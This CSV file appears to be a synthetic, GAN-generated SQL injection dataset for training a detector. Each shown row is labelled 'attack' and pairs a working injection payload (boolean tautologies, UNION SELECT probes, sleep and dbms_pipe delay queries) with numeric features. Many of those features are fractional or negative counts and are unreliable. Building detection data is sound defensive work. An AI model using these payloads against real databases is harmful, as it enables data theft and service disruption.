id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000101,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R007325,5.106517280396967,55.62432098388672,22.954896926879883,22.769304275512695,48.710975646972656,1.9659688472747803,28.690401077270508,14.753457069396973,1.0007957220077515,0.27280476689338684,0.15651282668113708,0.357200562953949,0.15455922484397888,3.0535924434661865,2.4786438941955566,0.9139184355735779,0.49188998341560364,0.41958290338516235,0.01663747802376747,-0.03724910691380501,3.5511887073516846,6.241340637207031,2.406726598739624,0.026132557541131973,0.7925811409950256,0.0956437736749649,0.04226602241396904,0.5230416655540466,0.23652546107769012,0.6002957820892334,0.0101545425131917,-0.0031127186957746744,0.27489686012268066,0.30973827838897705,0.8198756575584412,0.9109770059585571,-0.166824072599411,0.7530921697616577,-0.1421782523393631,0.29062938690185547,0.12756359577178955,0.049220241606235504,0.14600995182991028,0.15723156929016113,0.08007721602916718,-0.0027582065667957067,0.02461167983710766,0.2612901031970978,0.12972281873226166,0.12482846528291702,0.09637434780597687,0.13125550746917725,0.20864151418209076,0.04567896947264671,0.0413120798766613,0.00782677810639143,0.11722685396671295,0.026322882622480392,-0.0523444302380085,-0.37383976578712463,0.001318221795372665,0.27486392855644226,-0.00047898569027893245,-0.8269143104553223,0.1483020782470703,0.016197610646486282,-0.12072938680648804,-0.20206129550933838,-0.008751930668950081,0.0007313576643355191,0.0014282824704423547,-0.005918845534324646,-0.003776197787374258,-0.01762421242892742,0.0038097871001809835,0.10309508442878723,0.9656535983085632,0.5928499698638916,0.003095549065619707,0.09490402787923813,-0.017459888011217117,4.38088846206665,0.483919620513916,-0.10434065014123917,0.18074369430541992,0.10977029800415039,-0.08329737931489944,-0.04254067689180374,0.03334934636950493
GAN_000102,attack,union,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",nearest_attack_euclidean,R002948,6.359850350753655,-37.45372772216797,-24.06540298461914,25.446889877319336,-10.127723693847656,0.6287320852279663,15.136940002441406,0.5968551635742188,1.0012315511703491,0.0664190798997879,0.39478328824043274,0.28518667817115784,0.13574254512786865,2.5303854942321777,2.453897476196289,0.21709033846855164,1.636692762374878,0.46766889095306396,0.10938028246164322,-0.017098214477300644,0.6452982425689697,2.418123245239258,2.8486835956573486,0.03886464983224869,0.2243451178073883,0.058726776391267776,-0.0009494026890024543,-0.06827358901500702,0.7908322811126709,-0.008347906172275543,-0.025229955092072487,-0.02316891960799694,0.11748095601797104,0.5601075291633606,1.4734896421432495,-0.04729955270886421,-3.8499786853790283,0.25017648935317993,-0.2806139886379242,0.7530606985092163,0.6378036141395569,-0.8351320028305054,-0.12382686883211136,0.2586727738380432,0.03064057044684887,-0.035091668367385864,0.01878528669476509,0.20006512105464935,0.10186655819416046,0.1702214628458023,-0.0694219097495079,-0.09415054321289062,0.018199920654296875,0.0047822571359574795,-0.037606410682201385,-0.005625203717499971,0.08952594548463821,0.33261993527412415,-0.038435038179159164,-0.7275873422622681,-0.0008880663081072271,1.193845272064209,0.005250057205557823,-1.2972099781036377,0.10702681541442871,0.05723214149475098,-0.0705704391002655,-0.20455217361450195,0.19652356207370758,-0.005394970066845417,-0.023811936378479004,-0.011927216313779354,0.004683696199208498,-0.05050239339470863,-0.004440041724592447,0.18010541796684265,0.16198858618736267,0.4021836519241333,0.014118310064077377,0.09045402705669403,-0.10373503714799881,3.1989781856536865,0.12780149281024933,0.5039058923721313,-0.194715678691864,0.20348471403121948,-0.08985114842653275,0.19530831277370453,0.05628623440861702
GAN_000103,attack,boolean,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",nearest_attack_euclidean,R006822,8.2167490168592,109.07506561279297,28.370027542114258,34.78377914428711,109.02349853515625,3.4539363384246826,88.80644989013672,18.99403190612793,1.0002937316894531,0.2715604901313782,0.014165874570608139,0.4783064126968384,0.16055724024772644,3.5779612064361572,3.1324498653411865,0.8945356011390686,0.5388761162757874,0.3015948534011841,0.011201840825378895,-0.04816364496946335,8.007461547851562,16.231735229492188,2.0075414180755615,0.012060434557497501,1.9418894052505493,0.18844975531101227,-0.06549441814422607,0.46133023500442505,1.4744164943695068,1.0412603616714478,0.07406175881624222,0.02279094234108925,0.11479957401752472,0.7034865617752075,1.0643067359924316,0.8955487012863159,-1.9092309474945068,1.041426420211792,-0.919039785861969,0.13537929952144623,0.30021920800209045,0.3161981403827667,0.21867552399635315,0.3484143316745758,0.1014009639620781,0.0049658543430268764,0.12169498950242996,0.11644204705953598,0.2831920385360718,0.033554013818502426,0.44033363461494446,-0.053647298365831375,0.26738107204437256,-0.0011914096539840102,0.06201626732945442,0.029339082539081573,0.1311989426612854,0.09660594910383224,-0.13707591593265533,-0.5789889097213745,0.001819862867705524,0.6445543766021729,0.00028922187630087137,-1.1702674627304077,0.22318241000175476,-0.023379536345601082,-0.3368733823299408,-0.4301714301109314,-0.16180728375911713,0.0022861226461827755,-0.019116278737783432,-0.005510308779776096,-0.0007416057633236051,0.01493449043482542,-0.019408900290727615,0.10915056616067886,1.7453763484954834,1.0134910345077515,0.0014533356297761202,-0.05118583142757416,-0.1521417647600174,5.209843158721924,1.3826500177383423,-0.6740131378173828,0.5221705436706543,0.007625829428434372,-0.1602560132741928,0.08948972821235657,0.08402978628873825
GAN_000104,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R005801,4.539608578333957,147.5647430419922,36.02556228637695,30.279176712036133,69.24801635742188,0.30042269825935364,62.933624267578125,22.496021270751953,1.0009855031967163,0.2962861657142639,0.2109943926334381,0.4000747799873352,0.15723629295825958,3.579257011413574,1.4966884851455688,1.0893902778625488,1.689503788948059,0.20585383474826813,-0.0026097751688212156,0.024197719991207123,8.347817420959473,9.167181015014648,1.4969067573547363,-0.012700187973678112,1.2127385139465332,0.0482182614505291,0.00839290302246809,0.21295681595802307,-0.10521765798330307,0.7462044358253479,0.09617732465267181,0.012150833383202553,-0.013517548330128193,0.26022911071777344,1.0727850198745728,1.6213802099227905,1.5187935829162598,0.49506238102912903,0.13284622132778168,0.018101558089256287,0.49755561351776123,0.4234198331832886,0.11747809499502182,0.14587721228599548,0.040606554597616196,0.03843820095062256,0.03409074991941452,0.1451043337583542,-0.005767201539129019,-0.003800241043791175,0.33367228507995605,-0.09649531543254852,-0.02004273235797882,-0.007589987013489008,0.030278129503130913,-0.02698146179318428,0.06548997014760971,-0.08115777373313904,-0.01891813427209854,0.21580329537391663,0.0020849949214607477,0.456474244594574,-0.004242511931806803,0.7086209058761597,0.1703110933303833,-0.02430603839457035,-0.1145072877407074,-0.12401235103607178,-0.11937469989061356,-0.005741448141634464,0.029692141339182854,0.002071049762889743,0.0021399229299277067,0.080860435962677,-0.008074330165982246,0.06811557710170746,0.5784672498703003,0.9918572902679443,-0.006304789800196886,0.005087329540401697,-0.032381948083639145,5.3456950187683105,0.9721883535385132,-0.13537515699863434,0.16820481419563293,0.1369887739419937,-0.10216563940048218,0.3609464466571808,0.030082140117883682
GAN_000105,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,7.894009817962526,111.32029724121094,56.77001190185547,27.939929962158203,86.07459259033203,4.249600410461426,90.76641082763672,24.949947357177734,1.00089693069458,0.5051777958869934,0.04114582762122154,0.30864208936691284,0.19103766977787018,3.5295777320861816,-0.25298652052879333,1.5349392890930176,2.3535940647125244,0.41780996322631836,-0.01437628734856844,-0.030818387866020203,7.706116199493408,12.855833053588867,3.445066452026367,0.008187392726540565,1.0609090328216553,0.17902271449565887,-0.08355123549699783,1.2034069299697876,-0.5908456444740295,1.6789969205856323,0.04280731827020645,0.02583175338804722,-0.5529493093490601,0.019553013145923615,1.858742594718933,1.0451598167419434,3.900951623916626,-0.2199813574552536,-0.5024028420448303,0.3654802739620209,0.06103353947401047,0.7671506404876709,0.1621655821800232,0.20363199710845947,0.04821411892771721,0.01798696629703045,0.08793341368436813,-0.29125699400901794,-0.1445675939321518,-0.18419988453388214,0.4680672883987427,-0.18279032409191132,-0.18962030112743378,-0.0037773423828184605,0.17648398876190186,-0.04234223812818527,0.15001794695854187,0.16185003519058228,-0.09792168438434601,-0.1615535318851471,0.0069368500262498856,0.8287560939788818,-0.014206252992153168,0.778048574924469,0.33979740738868713,-0.08288799971342087,-0.43166384100914,-0.6330212354660034,-0.39625176787376404,-0.0025364954490214586,0.0119510842487216,-0.0025130840949714184,-0.0019508263794705272,0.06751767545938492,0.008700267411768436,0.20785823464393616,0.9142699241638184,1.6279270648956299,0.001172256306745112,0.0815572664141655,-0.04221924766898155,5.519795894622803,1.422048568725586,-0.3835281729698181,0.18830791115760803,0.08659154921770096,-0.2989720404148102,0.31658315658569336,0.03939589858055115
GAN_000106,attack,boolean,"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",nearest_attack_euclidean,R008712,4.475547037439041,77.59920501708984,24.229524612426758,27.798582077026367,32.598758697509766,0.7929626107215881,36.5883903503418,13.442095756530762,1.000643014907837,0.25306007266044617,0.2879329323768616,0.29940539598464966,0.15140904486179352,3.2110884189605713,0.75776606798172,0.645819365978241,2.0640597343444824,0.27634644508361816,0.11536119133234024,0.005540601909160614,2.966947555541992,4.866617202758789,3.294506072998047,0.004797606263309717,0.6997084617614746,0.03880241513252258,-0.01287675742059946,0.42772555351257324,-0.31507250666618347,0.5011177062988281,0.05161105468869209,-0.015204044990241528,-0.09256119281053543,0.22482453286647797,1.2274842262268066,0.879497230052948,2.527416706085205,0.2571277618408203,0.3879627287387848,0.5399988293647766,0.31630465388298035,-0.10143246501684189,-0.05032411590218544,0.10396353155374527,-0.029049353674054146,-0.022917352616786957,0.019881464540958405,0.03520069643855095,0.05179891362786293,0.12998197972774506,0.2040337175130844,-0.027940334752202034,-0.09802812337875366,0.011270762421190739,0.07146316766738892,-0.025613779202103615,0.04464852064847946,0.05225558578968048,-0.019361959770321846,-0.1240902692079544,-0.0003189621784258634,0.4124283790588379,-0.0013939664931967854,0.25417184829711914,0.10772360116243362,-0.012657075189054012,-0.049307931214571,-0.21301092207431793,0.0967022180557251,-0.002904193941503763,0.013555571436882019,0.00028672971529886127,0.002705455059185624,0.02461494505405426,0.009245004504919052,0.08581063151359558,0.10864871740341187,0.8483584523200989,0.007070840802043676,0.12292913347482681,0.0793936550617218,5.434744358062744,0.44137218594551086,0.36717113852500916,0.002913967939093709,0.1592913568019867,-0.07615954428911209,0.227621391415596,0.011507629416882992
GAN_000107,attack,boolean,"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R003917,6.39546567185425,213.85733032226562,40.314735412597656,42.21842956542969,74.81492614746094,-0.5598264932632446,57.98859786987305,23.91114616394043,0.9991942644119263,0.2803027927875519,0.2012978047132492,0.3985542058944702,0.10593429207801819,3.36887788772583,3.656402826309204,0.4842197299003601,-0.0738496258854866,0.2905479669570923,-0.06673792004585266,0.011856645345687866,8.917841911315918,10.678092956542969,2.608346462249756,-0.02892290987074375,0.8812585473060608,0.03738214448094368,0.0412239171564579,-0.6481944918632507,1.151673674583435,0.203008234500885,0.06616470217704773,-0.016746722161769867,-0.005842913873493671,0.8830693960189819,0.3893594741821289,1.1643617153167725,-2.8121774196624756,1.670602560043335,0.41486573219299316,0.18649452924728394,0.6446105241775513,0.15389502048492432,0.13076230883598328,0.24174706637859344,0.12215293198823929,-0.01921224221587181,0.05690033733844757,0.4704554080963135,0.3788363039493561,0.36533981561660767,0.6874110102653503,0.07992436736822128,-0.05102597177028656,0.01845366135239601,-0.04419323801994324,0.01848537288606167,0.0689072385430336,0.10403448343276978,-0.014339384622871876,-0.013105474412441254,0.0022282723803073168,0.15925821661949158,0.012412733398377895,0.4796335995197296,0.1431143581867218,0.06991308927536011,-0.03190779313445091,0.3926440477371216,0.18233038485050201,-0.004382282495498657,-0.028995316475629807,0.007795302197337151,0.005307550076395273,0.024008354172110558,-0.03922773525118828,-0.010226150043308735,0.9600815773010254,0.12925958633422852,0.007373832166194916,0.04704977944493294,-0.07229391485452652,4.636237621307373,0.713142991065979,-0.042690210044384,0.1541593372821808,-0.009806878864765167,0.008056153543293476,-0.31731554865837097,0.08662384003400803
GAN_000108,attack,time,1' and sleep  (  5  )  #,nearest_attack_euclidean,R007832,8.311905784786868,-125.72344207763672,11.274627685546875,-9.84012222290039,-26.100173950195312,0.9371507167816162,11.404359817504883,0.9201936721801758,1.0021947622299194,0.20614123344421387,0.10448712855577469,0.21879157423973083,0.1411096453666687,2.823180675506592,1.874572515487671,0.9310535788536072,0.1366807073354721,0.7751853466033936,0.06161634996533394,-0.04722297936677933,1.2947969436645508,0.06789422035217285,1.2161749601364136,0.026606490835547447,-0.0671834722161293,0.14618264138698578,-0.052133042365312576,0.31116777658462524,0.2590058147907257,1.334047794342041,-0.16646505892276764,-0.029215266928076744,0.7195701599121094,0.1392587274312973,1.3285237550735474,-0.20969824492931366,-6.5891923904418945,0.3517943024635315,-0.40571650862693787,0.13387861847877502,0.11580873280763626,0.29950323700904846,0.7502620816230774,0.12531253695487976,0.11429119110107422,0.02976856753230095,0.05619718134403229,-0.13242296874523163,-0.031455401331186295,-0.01658637635409832,-0.4632425308227539,-0.22739072144031525,0.7192590832710266,-0.026545105502009392,-0.05313216149806976,-0.012088480405509472,0.18097256124019623,0.27573686838150024,-0.07723046094179153,-0.6227407455444336,0.0035161536652594805,1.0425647497177124,0.012911820784211159,-0.5282719135284424,0.21115808188915253,-0.006359693128615618,-0.3730708956718445,-0.7372850775718689,-0.19508686661720276,0.007114513777196407,0.011073121801018715,-0.021654414013028145,0.0018158626044169068,-0.10500367730855942,-0.006259995512664318,0.17443828284740448,1.2431471347808838,0.7073990702629089,-0.01987421326339245,-0.06479507684707642,-0.3059020936489105,-2.351313591003418,0.8850124478340149,-0.10720498114824295,0.3258097767829895,0.43635210394859314,-0.2634774148464203,0.3497694432735443,0.0615471713244915
GAN_000109,attack,boolean,"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'msol'  =  'msol",nearest_attack_euclidean,R008070,7.328401780307895,239.6132049560547,84.91446685791016,32.35905456542969,87.16726684570312,2.268763542175293,53.85582733154297,26.86025619506836,0.998937726020813,0.5471527576446533,-0.06409977376461029,0.32536450028419495,0.08236070722341537,3.1025211811065674,2.618208169937134,1.7392209768295288,-1.2077889442443848,0.3520318269729614,-0.1395675390958786,-0.10627364367246628,7.8164167404174805,11.28763198852539,3.9507505893707275,-0.006758748088032007,0.7103978395462036,0.14025697112083435,0.05294320732355118,0.03803178668022156,0.8904064297676086,0.611323893070221,-0.039531171321868896,0.021738963201642036,-0.12839719653129578,0.5114707946777344,0.05940750986337662,0.8757370710372925,1.1724580526351929,1.5103672742843628,0.8816007971763611,0.4158262610435486,-0.05581892281770706,0.8869078159332275,0.20570404827594757,0.24613435566425323,0.19727984070777893,-0.042113613337278366,0.059371285140514374,0.2664562165737152,0.4389694035053253,0.33822304010391235,0.6761451959609985,0.24131475389003754,-0.2654551863670349,0.12090461701154709,0.10572037845849991,0.04413077235221863,0.11938406527042389,-0.0178457610309124,-0.056505896151065826,-0.29769572615623474,-0.0006324925343506038,0.26842737197875977,0.011308794841170311,-0.1818571388721466,0.25045502185821533,0.03425270691514015,0.021414831280708313,0.5083273649215698,0.1692689061164856,0.002551433863118291,-0.017870457842946053,0.0028747813776135445,-0.0034755526576191187,-0.031864508986473083,-0.010997417382895947,-0.004928677808493376,1.3293025493621826,-0.04271963611245155,0.022862253710627556,0.201080322265625,-0.03947347775101662,5.0868611335754395,0.809087336063385,-0.24926181137561798,0.32687464356422424,-0.14985963702201843,0.006046444643288851,-0.702701985836029,0.07057543843984604
GAN_000110,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,7.494991826442007,-81.81995391845703,-24.843685150146484,13.992639541625977,-44.13374328613281,-0.805789589881897,-1.8956772089004517,-1.9061698913574219,1.0020774602890015,0.05857346951961517,0.36957281827926636,0.24637000262737274,0.1080818772315979,2.403019428253174,3.3666768074035645,0.1885921061038971,0.6168387532234192,0.6053861379623413,0.04390151798725128,-0.00042095358367078006,2.0580530166625977,-1.3266212940216064,0.0799168050289154,0.040645401924848557,-0.4789535701274872,0.0445057637989521,0.034997642040252686,-0.48618873953819275,0.5694311261177063,-0.03389040380716324,-0.05745366960763931,-0.032026343047618866,0.21228273212909698,0.7674978971481323,1.2969337701797485,-0.04927711561322212,-8.158754348754883,0.4847296476364136,-0.35401007533073425,0.39937424659729004,0.7752264142036438,-0.35614657402038574,0.19026389718055725,0.17872925102710724,0.10473131388425827,0.005016739014536142,-0.005515830125659704,0.30511870980262756,-0.02278905175626278,0.1536744385957718,-0.1875910460948944,-0.2871161103248596,0.10984493046998978,-0.03291691467165947,-0.10615640133619308,-0.02332616038620472,0.07441922277212143,0.2110045999288559,-0.006778749171644449,-0.4770065248012543,0.005085320677608252,1.4511979818344116,0.014784551225602627,-1.3034989833831787,0.1715150773525238,0.08641523122787476,-0.19059082865715027,-0.13958461582660675,-0.019379300996661186,-0.010761999525129795,0.004621017258614302,-0.016672680154442787,0.005030697211623192,-0.05820125341415405,-0.03033960610628128,0.17606329917907715,0.04000494256615639,0.08356158435344696,-0.003516519907861948,-0.028721855953335762,-0.2743472158908844,-0.10897405445575714,0.12735535204410553,0.38096752762794495,-0.2399662733078003,0.3048228323459625,-0.12296754866838455,0.20242756605148315,0.07795467972755432
GAN_000111,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R002381,5.005621147750023,72.69248962402344,37.396018981933594,23.090564727783203,1.345596194267273,0.2370513528585434,9.480401992797852,9.781599044799805,0.9994376301765442,0.43046608567237854,0.1992729902267456,0.17543506622314453,0.08631164580583572,2.755171775817871,0.883910059928894,0.49074941873550415,0.7037653923034668,0.5132226943969727,0.049758464097976685,-0.018341409042477608,1.8547675609588623,2.3824169635772705,5.167313098907471,-0.00043407222256064415,-0.7948977947235107,0.05859154835343361,0.038496874272823334,0.019428059458732605,0.40752679109573364,0.3345174789428711,-0.05115429311990738,-0.028238888829946518,-0.32812783122062683,0.3814127743244171,0.8905812501907349,0.0705166608095169,-0.4303431212902069,0.44867658615112305,0.9078097343444824,0.831148087978363,0.25804054737091064,0.106231190264225,0.09623835980892181,0.09821438789367676,0.07002946734428406,-0.05707075819373131,-0.003702351590618491,0.04762807860970497,0.22299879789352417,0.3433782160282135,0.29269692301750183,-0.006453054957091808,-0.13878457248210907,0.018739942461252213,0.04570682346820831,-0.0023330925032496452,0.07913582772016525,0.23196303844451904,0.002170593710616231,-0.4938882291316986,0.0088779516518116,0.5764170289039612,0.013223442249000072,0.17843404412269592,0.15938426554203033,0.06641299277544022,-0.07676935195922852,0.03855949640274048,0.0352131649851799,-0.002297448692843318,-0.01701943948864937,-0.0017855396727100015,0.00019572848395910114,-0.03236308693885803,-0.014363116584718227,0.07321725785732269,0.04310247674584389,0.005830404814332724,0.015295326709747314,0.22945745289325714,0.004041292238980532,1.5341252088546753,-0.050974711775779724,0.6444171667098999,-0.29412001371383667,0.053177546709775925,-0.0439634695649147,-0.2733769416809082,0.035937726497650146
GAN_000112,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,6.04066884052414,198.96046447753906,69.66260528564453,28.141828536987305,95.68048095703125,3.013075113296509,72.85600280761719,28.400991439819336,0.9994410872459412,0.479385644197464,0.0007175024366006255,0.37556692957878113,0.1238187924027443,3.709474802017212,1.521033525466919,1.0967662334442139,0.5628258585929871,0.22916096448898315,-0.024722952395677567,-0.06299398094415665,8.675434112548828,12.959970474243164,3.3564562797546387,-0.007900137454271317,1.3309955596923828,0.11877114325761795,-0.021191740408539772,0.2795321047306061,0.6389831304550171,1.0019357204437256,0.04987064749002457,0.03376778960227966,-0.02838272415101528,0.35090482234954834,0.8706552386283875,1.166817545890808,1.7569767236709595,0.9381463527679443,0.3943922221660614,0.24717751145362854,0.2651822566986084,0.7730793356895447,0.2886062264442444,0.2320185899734497,0.08821980655193329,0.007409201003611088,0.08611661195755005,0.0083585474640131,0.2855563759803772,0.1506073772907257,0.527176022529602,0.05656969174742699,0.031936246901750565,0.032988302409648895,0.08696436882019043,0.012378142215311527,0.09986793994903564,-0.009610097855329514,-0.07231779396533966,-0.13263194262981415,-0.0019568304996937513,0.2613387405872345,0.006671612616628408,0.4814968407154083,0.19947637617588043,-0.02873039059340954,-0.13715527951717377,-0.20569026470184326,-0.03522246330976486,0.0003443524765316397,0.0051581705920398235,0.005372405517846346,0.0015458808047696948,0.03769241273403168,-0.018458660691976547,0.024617839604616165,1.2384761571884155,0.7777916789054871,0.006826025899499655,0.031515829265117645,-0.03909855708479881,5.382640838623047,1.1206167936325073,-0.38596707582473755,0.49010321497917175,0.009573407471179962,-0.08787211775779724,-0.06243378296494484,0.055617205798625946
GAN_000113,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R007325,6.088546163923712,-51.28539276123047,4.9881744384765625,3.671076536178589,10.442344665527344,0.15953388810157776,18.92957305908203,5.742609024047852,1.001608967781067,0.23768700659275055,0.12697722017765045,0.31118372082710266,0.14627373218536377,3.0467138290405273,2.981588363647461,0.6617259979248047,-0.16283507645130157,0.6277139782905579,-0.034792426973581314,-0.03843671828508377,3.1259756088256836,2.4321959018707275,0.03337666392326355,0.03871432691812515,0.43565866351127625,0.0869329497218132,-0.0025950162671506405,0.14201658964157104,0.17108891904354095,0.8659107685089111,-0.07251390814781189,-0.014146487228572369,0.7138097286224365,0.15510064363479614,0.8881081938743591,0.5236988663673401,-4.598913669586182,0.6630591154098511,-0.2638603150844574,-0.015682101249694824,0.2988917827606201,0.2591504752635956,0.49079445004463196,0.10909527540206909,0.12599581480026245,0.05435725301504135,0.03924508020281792,0.08357249945402145,-0.021771928295493126,0.005251975730061531,-0.29381459951400757,-0.12261699140071869,0.714158296585083,-0.023535316810011864,-0.046816326677799225,-0.006501819472759962,0.13394270837306976,0.10657564550638199,-0.04113098606467247,-0.14123716950416565,0.00314916274510324,0.710671067237854,0.009638531133532524,-0.7582356929779053,0.16175343096256256,0.03765208646655083,-0.29255712032318115,-0.5325641632080078,-0.29467013478279114,0.0009390453924424946,0.005960035137832165,-0.013029943220317364,8.310289558721706e-05,-0.04202314093708992,-0.0159174632281065,0.1201481744647026,1.096481204032898,0.6516558527946472,-0.013596002012491226,-0.03896068036556244,-0.24781237542629242,0.6143848299980164,0.7274032235145569,-0.2316289097070694,0.2834983170032501,0.24490901827812195,-0.16029387712478638,0.1949026882648468,0.06332459300756454
GAN_000114,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.671780281568665,144.8635711669922,38.92396926879883,25.940338134765625,90.7418212890625,1.3991937637329102,67.5036849975586,26.300573348999023,1.000710129737854,0.445475697517395,0.14680716395378113,0.3788054883480072,0.16815565526485443,3.846745014190674,1.1489512920379639,0.9988930821418762,1.4637134075164795,0.33459630608558655,-0.029689665883779526,0.025981711223721504,10.125531196594238,10.165453910827637,1.7027781009674072,0.005652370397001505,1.0925489664077759,0.0729866474866867,0.006614642683416605,0.6182270050048828,-0.42196062207221985,1.1574095487594604,0.10228905826807022,0.02220350317656994,-0.006225367076694965,-0.09904886782169342,1.1763360500335693,1.752346396446228,3.0238869190216064,0.3442442715167999,0.16689883172512054,0.027387723326683044,0.30094030499458313,0.563258171081543,0.24763765931129456,0.10275911539793015,0.032709360122680664,0.04201969504356384,0.06099783256649971,0.030011678114533424,-0.043472353368997574,-0.13479448854923248,0.3003943860530853,-0.08322088420391083,0.14435140788555145,-0.04181783273816109,0.06500419974327087,-0.041372522711753845,0.0713091492652893,-0.23445047438144684,-0.02578948624432087,0.3926032781600952,0.0007199330138973892,0.2909798324108124,-0.003745704423636198,0.8886164426803589,0.20566730201244354,-0.02309689112007618,-0.28147900104522705,-0.4674082398414612,-0.4501931071281433,-0.004242353606969118,0.030274279415607452,0.005563019309192896,5.9164216509088874e-05,0.10329703241586685,-0.008837182074785233,0.07560320198535919,0.6097030639648438,1.3924682140350342,-0.013594829477369785,0.07265790551900864,0.011154656298458576,5.945586204528809,1.0061625242233276,-0.35111480951309204,0.25579574704170227,0.09651511162519455,-0.17824909090995789,0.3983684480190277,0.033548273146152496
GAN_000115,attack,boolean,-3496'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R002318,10.77656602865286,-107.1689224243164,-60.33897018432617,20.576509475708008,-16.733081817626953,-0.811360239982605,22.126789093017578,-2.5440616607666016,1.0030466318130493,-0.2078036218881607,0.42613449692726135,0.43265673518180847,0.14345614612102509,2.871060609817505,6.19663143157959,-0.25976091623306274,0.37335240840911865,0.6812198758125305,0.01986049674451351,0.016821356490254402,6.797832012176514,4.828254222869873,-2.241328477859497,0.02076181210577488,0.7566862106323242,0.03890387341380119,-0.0033030654303729534,-0.9648720622062683,1.370470404624939,-0.043081559240818024,0.036134473979473114,-0.0629742294549942,1.0364240407943726,1.3381569385528564,1.3948116302490234,0.4716241955757141,-14.25153923034668,1.176842212677002,-1.404318928718567,-0.19245217740535736,1.2089627981185913,-0.8400139808654785,0.3229161202907562,0.3346381187438965,0.11547340452671051,0.06360390782356262,0.061988525092601776,0.5684271454811096,0.057858821004629135,0.1117531880736351,-0.1980379819869995,-0.3987804353237152,0.40109920501708984,-0.1262243241071701,-0.22216781973838806,-0.012967306189239025,0.06625986099243164,0.05432063713669777,-0.06239734962582588,-0.4193853735923767,0.004582605324685574,1.6544653177261353,0.016548415645956993,-2.0078043937683105,0.1467680186033249,0.09499745815992355,-0.3310700058937073,-0.47820866107940674,0.03817219287157059,-0.011787442490458488,-0.0009256903431378305,-0.019140584394335747,0.01142758410423994,-0.05629103630781174,-0.06028998643159866,0.1718478798866272,0.6505863070487976,0.5264072418212891,-0.01663009263575077,-0.25809991359710693,-0.42134448885917664,0.8234788775444031,0.7497360706329346,-0.35265254974365234,0.11764054000377655,0.4135425090789795,-0.15677402913570404,0.7935725450515747,0.14391657710075378
